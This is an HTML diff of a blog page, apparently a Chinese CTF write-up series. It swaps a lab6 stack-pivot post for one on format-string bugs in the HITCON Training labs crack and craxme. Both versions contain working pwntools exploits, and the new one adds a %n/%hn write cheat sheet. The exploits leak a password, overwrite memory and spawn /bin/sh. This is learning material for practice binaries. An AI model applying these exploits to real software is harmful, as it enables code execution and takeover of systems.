@@ -249,13 +249,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/13.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Pwn-10月25-Hitcon(三)
+                        Pwn-10月26-Hitcon-四
                     </div>
                 </div>
             </div>
@@ -368,7 +368,7 @@
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2018-10-25
+                    <i class="fa fa-clock-o fa-fw"></i>2018-10-26
                 </span>
             </div>
         </div>
@@ -376,112 +376,169 @@
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <p>[TOC]</p>
-<h1 id="Pwn-10月25-Hitcon-三"><a href="#Pwn-10月25-Hitcon-三" class="headerlink" title="Pwn-10月25-Hitcon(三)"></a>Pwn-10月25-Hitcon(三)</h1><blockquote>
-<p>一天一天慢慢来，😭</p>
+<h1 id="Pwn-10月26-Hitcon-四"><a href="#Pwn-10月26-Hitcon-四" class="headerlink" title="Pwn-10月26-Hitcon-四"></a>Pwn-10月26-Hitcon-四</h1><blockquote>
+<p>练习Hitcon的第四天🐷，愉快地学习fsb（Format string bug），格式化字符串漏洞。</p>
 </blockquote>
-<h2 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6-migration"></a>lab6-migration</h2><blockquote>
-<p>这个题目涉及到栈迁移(stack-pivot)，在<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others/#stack-pivoting" target="_blank" rel="noopener">ctf-wiki</a>上面是有这个例题和解释的。</p>
-<blockquote>
-<p>该技巧就是劫持栈指针指向攻击者所能控制的内存处，然后再在相应的位置进行 ROP。一般来说，我们可能在以下情况需要使用 stack pivoting</p>
+<h2 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7-crack"></a>lab7-crack</h2><blockquote>
+<p>好👍，这题开始接触格式化字符串漏洞。</p>
+<p>什么是格式化字符串漏洞？我们知道c/c++中<code>printf</code>函数输出值需要对应的参数，但当提供的参数出现问题，或者没有提供参数的时候，格式化字符串漏洞就可能出现了。<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro/#_6" target="_blank" rel="noopener">CTF-wiki传送门</a></p>
+<p>那么假设，此时我们在编写程序时候，写成了下面的样子</p>
+<pre><code>printf(&quot;Color %s, Number %d, Float %4.2f&quot;);
+</code></pre><p>此时我们可以发现我们并没有提供参数，那么程序会如何运行呢？程序照样会运行，会将栈上存储格式化字符串地址上面的三个变量分别解析为</p>
+<ol>
+<li><strong>解析其地址对应的字符串</strong></li>
+<li>解析其内容对应的整形值</li>
+<li>解析其内容对应的浮点值</li>
+</ol>
+<p>由此可见<a href="http://www.cnblogs.com/Ox9A82/p/5429099.html" target="_blank" rel="noopener">格式化字符串漏洞</a>主要是：</p>
 <ul>
-<li>可以控制的栈溢出的字节数较少，难以构造较长的 ROP 链</li>
-<li>开启了 PIE 保护，栈地址未知，我们可以将栈劫持到已知的区域。</li>
-<li>其它漏洞难以利用，我们需要进行转换，比如说将栈劫持到堆空间，从而在堆上写 rop 及进行堆漏洞利用</li>
+<li><p><strong>1.泄漏任意地址的值，leak内存（比如leak出libc基地址）</strong></p>
+</li>
+<li><p><strong>2.写任意地址，可用于修改got表</strong></p>
+</li>
 </ul>
-<p>此外，利用 stack pivoting 有以下几个要求:</p>
-<ul>
-<li>可以控制程序执行流。</li>
-<li>可以控制 sp 指针。一般来说，控制栈指针会使用 ROP，常见的控制栈指针的 gadgets 一般是</li>
-</ul>
-<pre class=" language-assembly"><code class="language-assembly">pop rsp/esp
+</blockquote>
+<pre class=" language-bash"><code class="language-bash">这部分来自icemakr的博客 <span class="token operator">==</span><span class="token operator">></span>向大佬致敬
+
+32位
+
+读
+
+<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 读4个字节
+<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 同上面
+<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>
+写
+
+<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 解引用，写入四个字节
+<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // 解引用，写入两个字节
+<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入一个字节
+<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入八个字节
+64位
+
+读
+
+<span class="token string">'%{}<span class="token variable">$x</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>      // 读4个字节
+<span class="token string">'%{}<span class="token variable">$lx</span>'</span>.format<span class="token punctuation">(</span>index, num<span class="token punctuation">)</span>     // 读8个字节
+<span class="token string">'%{}<span class="token variable">$p</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 读8个字节
+<span class="token string">'${}<span class="token variable">$s</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>
+写
+
+<span class="token string">'%{}<span class="token variable">$n</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>           // 解引用，写入四个字节
+<span class="token string">'%{}<span class="token variable">$hn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>          // 解引用，写入两个字节
+<span class="token string">'%{}<span class="token variable">$hhn</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入一个字节
+<span class="token string">'%{}<span class="token variable">$lln</span>'</span>.format<span class="token punctuation">(</span>index<span class="token punctuation">)</span>         // 解引用，写入八个字节
+%1<span class="token variable">$lx</span><span class="token keyword">:</span> RSI
+%2<span class="token variable">$lx</span><span class="token keyword">:</span> RDX
+%3<span class="token variable">$lx</span><span class="token keyword">:</span> RCX
+%4<span class="token variable">$lx</span><span class="token keyword">:</span> R8
+%5<span class="token variable">$lx</span><span class="token keyword">:</span> R9
+%6<span class="token variable">$lx</span><span class="token keyword">:</span> 栈上的第一个QWORD
 </code></pre>
-</blockquote>
-<p>在这题中，溢出长度不够导致无法一次性构造ropchain，并且还限制了main函数溢出的次数。</p>
-</blockquote>
 <h3 id="检查保护措施"><a href="#检查保护措施" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote>
-<p><code>checksec migration</code></p>
-<p><img src="https://i.loli.net/2018/10/25/5bd172b663166.png" alt=""></p>
-<p>开启了NX。</p>
+<p>按套路来，先<code>checksec crack</code>:</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2aa6e80564.png" alt=""></p>
+<p>可以看到开启了栈溢出保护(canary found)，以及栈不可执行(NX)措施，很明显让我们从别处入手。</p>
+<p>简单运行一下：</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2aacec0ef5.png" alt=""></p>
+<p>我们需要输入两个值，一个是name，输入之后会被打印，一个是password。</p>
+<p><a href="http://m4x.fun/post/hitcon-training-writeup/#lab7-crack" target="_blank" rel="noopener">m4x师傅</a>的逻辑：<code>输出 name 时有明显的格式化字符串漏洞，这个题的思路有很多，可以利用 fsb 改写 password，或者 leak 出 password，也可以直接通过 fsb，hijack puts_got 到 system(“cat flag”) 处（注意这里 printf 实际调用了 puts）</code>。</p>
 </blockquote>
 <h3 id="逻辑分析"><a href="#逻辑分析" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote>
-<p>ida 里面看一看：</p>
-<p><img src="https://i.loli.net/2018/10/25/5bd1738bc3bfe.png" alt=""></p>
-<p>buf大小为0x28 = 40字节，而read读取0x40 = 64字节</p>
-<p>gdb跑一下，看看具体情况：</p>
-<p><img src="https://i.loli.net/2018/10/25/5bd17674836d1.png" alt=""></p>
-<p>也就是说有4个字节被读取到EBP中，剩下20个溢出字节可以用来构造ropchain。</p>
-<p>搜索一下可用的gadget：</p>
-<p><img src="https://i.loli.net/2018/10/25/5bd18186ce41f.png" alt=""></p>
+<p>idapro启动！！启动！！给我启动啊！！🙃！main函数：</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2ac48e9124.png" alt=""></p>
 </blockquote>
-<h3 id="构造exp"><a href="#构造exp" class="headerlink" title="构造exp"></a>构造exp</h3><p>exp：</p>
-<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
-<span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-S</span>
+<h4 id="exp1：通过格式化字符串漏洞泄露password"><a href="#exp1：通过格式化字符串漏洞泄露password" class="headerlink" title="exp1：通过格式化字符串漏洞泄露password"></a>exp1：通过格式化字符串漏洞泄露password</h4><blockquote>
+<p><img src="https://i.loli.net/2018/10/26/5bd2b96d60a25.png" alt=""></p>
+<p>简单测试一下我们可以看到一些有趣的东西，这些应该是<code>printf</code>栈中的数据，那么我们只要找到栈中存储我们输入的内容的位置，假如输入的是某地址，再用%s解析就可获得该地址下的内容：</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2bb34567e1.png" alt=""></p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2c986ab76f.png" alt=""></p>
+<p>可以看到输入的内容在栈中的第十个位置，这里学到一个小知识，<code>%10$s</code>中格式化字符串的“$”操作符，其允许我们从格式化字符串中选取一个位置的参数作为特定的参数。我们可以从IDA中得到<code>password_addr=0x804A080</code>，然后构造EXP。</p>
+</blockquote>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span>
+
 <span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
-context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+<span class="token keyword">from</span> libnum <span class="token keyword">import</span> n2s
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
 
-p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./migration'</span><span class="token punctuation">)</span>
-elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./migration"</span><span class="token punctuation">)</span>
-libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/i386-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span>
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>
 
-system_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span>
-<span class="token keyword">print</span> <span class="token string">"system_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>system_libc<span class="token punctuation">)</span>
-read_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"read"</span><span class="token punctuation">]</span>
-<span class="token keyword">print</span> <span class="token string">"read_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span>
-puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
-<span class="token keyword">print</span> <span class="token string">"puts_got:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
-puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
-<span class="token keyword">print</span> <span class="token string">"puts_plt:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span>
-puts_libc <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
-<span class="token keyword">print</span> <span class="token string">"puts_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_libc<span class="token punctuation">)</span>
-binsh_libc<span class="token operator">=</span> libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span> <span class="token string">"binsh_libc:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>binsh_libc<span class="token punctuation">)</span>
+pwd_addr<span class="token operator">=</span> <span class="token number">0x804A048</span>
 
-leave_ret <span class="token operator">=</span> <span class="token number">0x08048418</span>
-p3ret <span class="token operator">=</span> <span class="token number">0x08048569</span> <span class="token comment" spellcheck="true">#pop esi ; pop edi ; pop ebp ; ret</span>
-p1ret <span class="token operator">=</span> <span class="token number">0x0804836d</span> <span class="token comment" spellcheck="true">#pop_ebp_ret</span>
-buf1 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x500</span>
-buf2 <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">0x400</span>
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">' ?'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p32<span class="token punctuation">(</span>pwd_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"|%10$x||"</span><span class="token punctuation">)</span>
 
-payload <span class="token operator">=</span> <span class="token string">'a'</span><span class="token operator">*</span><span class="token number">40</span>
-<span class="token comment" spellcheck="true"># buf1 为ebp，eip ==> read_plt ==> leave_ret为返回地址 ==>read(0,buf1,0x100)</span>
-payload <span class="token operator">+=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
-<span class="token comment" spellcheck="true">#leave;ret ==> mov ebp,esp; pop ebp; ret;</span>
-p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">" :\n"</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
-
-<span class="token comment" spellcheck="true">#通过之前的leave_ret，将buf2作为ebp，得到puts_addr,通过libc泄露得到binsh，system_addr</span>
-payload<span class="token operator">=</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>p1ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>read_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>leave_ret<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>buf2<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
-
-puts_addr <span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span> <span class="token string">"puts_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span>
-offset <span class="token operator">=</span> puts_addr <span class="token operator">-</span> puts_libc
-system_addr <span class="token operator">=</span> system_libc <span class="token operator">+</span> offset
-binsh <span class="token operator">=</span> binsh_libc <span class="token operator">+</span>offset
-<span class="token triple-quoted-string string">'''
-payload =p32(buf1)+p32(read_plt)+p32(p3ret)+p32(0)+p32(buf1)+p32(0x100)+p32(system_addr)+p32(0xdeadbeef)+p32(buf1)
-p.send(payload)
-sleep(0.1)
-#p.send("/bin/sh\0")
-p.interactive()
-'''</span>
-
-<span class="token comment" spellcheck="true">#懵逼栈</span>
-payload <span class="token operator">=</span>p32<span class="token punctuation">(</span>buf1<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"bbbb"</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
-sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
-
-
+io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#drop = True 表示丢弃pattern，不接受pattern</span>
+pwd <span class="token operator">=</span> str<span class="token punctuation">(</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'||'</span><span class="token punctuation">,</span>drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
 
 </code></pre>
-<p>exp运行效果：<img src="https://i.loli.net/2018/10/25/5bd17a3f8c896.png" alt=""></p>
+<p>运行效果：</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2bd871ce46.png" alt=""></p>
+<h4 id="exp2：修改随机数"><a href="#exp2：修改随机数" class="headerlink" title="exp2：修改随机数"></a>exp2：修改随机数</h4><blockquote>
+<p>简单了解fmtstr之后，知道原来还有这么骚的pwntools模块，这里简单对这个exp做个分析理解。</p>
+</blockquote>
+<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#来自Veritas501大佬的exp</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
+cn <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./crack'</span><span class="token punctuation">)</span>
+p_pwd <span class="token operator">=</span> <span class="token number">0x0804A048</span>
+fmt_len <span class="token operator">=</span> <span class="token number">10</span>
+cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+pay <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span>fmt_len<span class="token punctuation">,</span><span class="token punctuation">{</span>p_pwd<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pay<span class="token punctuation">)</span>
+cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+cn<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
+cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+cn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+</code></pre>
+<p>运行效果:</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2c4a2645c3.png" alt=""></p>
+<h2 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8-craxme"></a>lab8-craxme</h2><blockquote>
+<p>这也是一题格式化字符串漏洞😄，我们可以直接通过类似上面题exp2的方式来修改值达到目的。</p>
+</blockquote>
+<h3 id="检查保护措施-1"><a href="#检查保护措施-1" class="headerlink" title="检查保护措施"></a>检查保护措施</h3><blockquote>
+<p><code>checksec craxme</code>:</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2cbf09c0e6.png" alt=""></p>
+<p>可以看到几乎所有保护措施都打开，无法通过栈溢出或者栈执行等漏洞进行攻击。</p>
+</blockquote>
+<h3 id="逻辑分析-1"><a href="#逻辑分析-1" class="headerlink" title="逻辑分析"></a>逻辑分析</h3><blockquote>
+<p>像lab8一样，我们可以在ida里面看到有格式化字符串漏洞：</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2cc3c37cec.png" alt=""></p>
+<p>我们可以运行一下试试</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2cb30efb76.png" alt=""></p>
+<p>可以看到在printf函数栈中第七个位置是我们输入的内容，那么我们就可利用pwntools的fmtstr_payload来改变magic的值。</p>
+<p>通过ida找到magic的地址：</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2cd771b79f.png" alt=""></p>
+<p>通过Pwntools.ELF:</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2ce6d80f25.png" alt=""></p>
+</blockquote>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
+<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>
+
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>
+
+magicAddr <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"magic"</span><span class="token punctuation">]</span>
+inputs <span class="token operator">=</span> int<span class="token punctuation">(</span>input<span class="token punctuation">(</span><span class="token string">"[+]1.flag\n[+]2.craxflag\ninput:"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> inputs <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xda</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    payload <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>magicAddr<span class="token punctuation">:</span> <span class="token number">0xfaceb00c</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+
+io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./craxme"</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">" :"</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+</code></pre>
+<p>运行效果：</p>
+<p><img src="https://i.loli.net/2018/10/26/5bd2cfce6cf83.png" alt=""></p>
 <blockquote>
-<p>这题伪造假栈帧，从而构造ropchain，简直就是一场消化盛宴，我需要好好消化一下lab6。</p>
-<p>今天还看了一下安恒一周年特别赛的一道pwn题–over，做一半发现只能控制ebp和eip？？？没想到是安恒杯六月赛的一道原题，在ctf-wiki的花式栈溢出技巧里面有，并且和lab6一样也是通过控制ebp和eip来做，但是那题并没有多出来的溢出字节。</p>
-<p>总的来说，两种都可以称作伪造假栈帧：<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/others/#_6" target="_blank" rel="noopener">CTF-WIKI-花式栈溢出</a>。</p>
+<p>今天的格式化字符串漏洞就学到这儿啦，难受😭。</p>
 </blockquote>
 
             </div>
@@ -621,7 +678,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="http://www.yof3ng.xyz" class="b-link-green">Yof3ng's Blog | 热爱分享</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2018/10/25/Pwn-10月25-Hitcon-三/" class="b-link-green">Pwn-10月25-Hitcon(三)</a>
+                    <a href="/2018/10/26/Pwn-10月26-Hitcon-四/" class="b-link-green">Pwn-10月26-Hitcon-四</a>
                 </p>
             </div>
         </div>
@@ -643,7 +700,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
         repo: 'yof3ng.github.io',
         owner: 'Yof3ng',
         admin: "Yof3ng",
-        id: '2018-10-25T08-54-34',
+        id: '2018-10-26T13-21-15',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -660,8 +717,8 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">上一篇</div>
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">本篇</div>
             <div class="card">
                 <a href="/2018/10/26/Pwn-10月26-Hitcon-四/">
                     <div class="card-image">
@@ -681,9 +738,9 @@ lab7-crack
 好👍，这题开始接触格式化字符串漏洞。
 什么是格式化字符串漏</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-26
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-26
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -696,6 +753,7 @@ lab7-crack
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -720,25 +778,27 @@ lab7-crack
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">下一篇</div>
             <div class="card">
-                <a href="/2018/10/24/Pwn-10月24-hitcon-二/">
+                <a href="/2018/10/25/Pwn-10月25-Hitcon-三/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="Pwn-10月24-hitcon(二)">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="Pwn-10月25-Hitcon(三)">
                         
-                        <span class="card-title">Pwn-10月24-hitcon(二)</span>
+                        <span class="card-title">Pwn-10月25-Hitcon(三)</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary">[TOC]
-Pwn-10月24-hitcon(二)
-继续hitcon的解题之路。
+Pwn-10月25-Hitcon(三)
+一天一天慢慢来，😭
 
-lab4 - ret2lib
-拿到题目看题目名，和lab3的ret2sc差不多，这个应该是return to libc，也是一种攻击手法。泄露libc并且l</div>
+lab6-migration
+这个题目涉及到栈迁移(stack-pivot)，在ctf-wiki上面是有这个例题和解释的。
+
+该技巧就是劫持栈指针指向攻击者所能控制</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-24
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-10-25
                             </span>
                         <span class="publish-author">
                             
@@ -780,7 +840,7 @@ lab4 - ret2lib
         <div class="toc-widget">
             <h4>目录</h4>
             <div id="toc-content">
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#Pwn-10月25-Hitcon-三"><span class="post-toc-text">Pwn-10月25-Hitcon(三)</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#lab6-migration"><span class="post-toc-text">lab6-migration</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#检查保护措施"><span class="post-toc-text">检查保护措施</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#逻辑分析"><span class="post-toc-text">逻辑分析</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#构造exp"><span class="post-toc-text">构造exp</span></a></li></ol></li></ol></li></ol>
